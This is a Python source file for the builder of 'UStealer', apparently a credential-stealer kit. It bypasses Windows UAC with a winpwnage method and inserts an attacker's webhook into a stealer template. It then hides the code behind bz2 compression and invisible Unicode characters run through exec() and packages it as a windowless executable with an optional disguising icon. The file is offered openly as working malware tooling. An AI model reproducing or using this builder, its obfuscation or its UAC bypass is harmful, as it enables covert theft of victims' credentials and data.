import sys
from winpwnage.functions.uac.uacMethod1 import uacMethod1
def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

if not IsAdmin():
    uacMethod1(sys.argv)

# execute code
import os
import customtkinter as ctk
from tkinter import messagebox, filedialog
import bz2
import re

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"UStealer Builder ~ Version 1.3")
app.geometry("400x240")
app.resizable(False, False)
          
app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return 'api/webhooks' in webhook
  

def extract_imports_from_code(pycode):
    import_pattern = re.compile(r'^\s*(import|from)\s+[\w\.]+', re.MULTILINE)
    imports = import_pattern.findall(pycode)
    return '\n'.join([line for line in pycode.splitlines() if import_pattern.match(line)])

def extract_imports_from_code(pycode):
    import_pattern = re.compile(r'^\s*(import|from)\s+[\w\.]+', re.MULTILINE)
    imports = [line for line in pycode.splitlines() if import_pattern.match(line)]
    return '\n'.join(imports)

def string_to_binary(s):
    return ''.join(format(byte, '08b') for byte in s.encode('utf-8'))

def obf_binary(code):
    decode_def = """
def decode_bin(b):
    b = b.replace('\\u202E', '1').replace('\\u202D', '0')
    A = int(b, 2)
    return A.to_bytes((A.bit_length() + 7) // 8, 'big').decode()
"""
    binary_destroy = bz2.compress(string_to_binary(code).replace('0', '\u202D').replace('1', '\u202E').encode('utf-8'))
    obfuscated_code = f"""
{decode_def}
exec(decode_bin(__import__('bz2').decompress({repr(binary_destroy)}).decode()))
"""
    return obfuscated_code

def obfuscate_code(code):
    ax = extract_imports_from_code(code)
    code = obf_binary(code)
    return ax + "\n\n" + code

def replace_webhook(webhook):
    file_path = r'assets\stealer.py'
    old_webhook = 'YOUR_WEBHOOK_URL'

    with open(file_path, 'r', encoding='utf-8') as file:
        content = file.read()

    # Replace old webhook with new webhook
    updated_content = content.replace(old_webhook, webhook)

    with open("main.py", 'w', encoding='utf-8') as file:
        file.write(obfuscate_code(updated_content))

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''


        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller main.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

label = ctk.CTkLabel(master=app, text="UStealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()
